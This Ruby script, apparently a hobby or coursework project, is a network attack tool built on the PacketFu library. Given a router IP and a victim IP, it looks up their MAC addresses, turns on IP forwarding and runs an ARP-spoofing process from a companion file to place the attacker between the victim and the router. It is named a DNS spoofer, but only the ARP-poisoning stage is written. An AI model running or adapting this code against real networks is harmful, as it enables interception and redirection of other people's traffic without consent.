# Module to determine OS type
module OsType
    def is_mac?
        RUBY_PLATFORM.downcase.include?("darwin")
    end
    def is_linux?
        RUBY_PLATFORM.downcase.include?("linux")
    end
end

# Gems
require 'rubygems'
require 'packetfu'

# Files
require './arpSpoof.rb'

# Includes so we don't have to use fully qualified class names
include PacketFu

class DnsSpoof
    
    def initialize (routerIP, victimIP, interface)
        
        # Check for values
        if routerIP == nil || victimIP == nil || interface == nil
            puts "Usage: routerIP victimIP interface\n"
            exit
        end
        
        # Store global info
        @routerIP = routerIP
        @victimIP = victimIP
        @interface = interface
        
        # Get the MAC address of the router
        @routerMAC = Utils.arp(routerIP, :iface => @interface)
        
        # Get the MAC address of the victim
        @victimMAC = Utils.arp(victimIP, :iface => @interface)
        
        # Get our information
        @ourInfo = Utils.whoami?(:iface => interface)
        
        # Enable IP forwarding based on the OS (Linux or OS X)
        # TODO: Add check for OS
        `sysctl -w net.inet.ip.forwarding=1`
    end
    
    def main
        
        # Create the ARP Spoofing process
        @pid = fork do
            Signal.trap("INT") { `sysctl -w net.inet.ip.forwarding=0`; exit }
            arp = ArpSpoof.new(@routerIP, @routerMAC, @victimIP, @victimMAC,
                               @interface, @ourInfo)
            arp.runspoof
        end
        
        sleep 5
        Process.kill("INT", @pid)
        Process.wait
        
        
    end
    
end

spoof = DnsSpoof.new(ARGV[0], ARGV[1], ARGV[2])
spoof.main
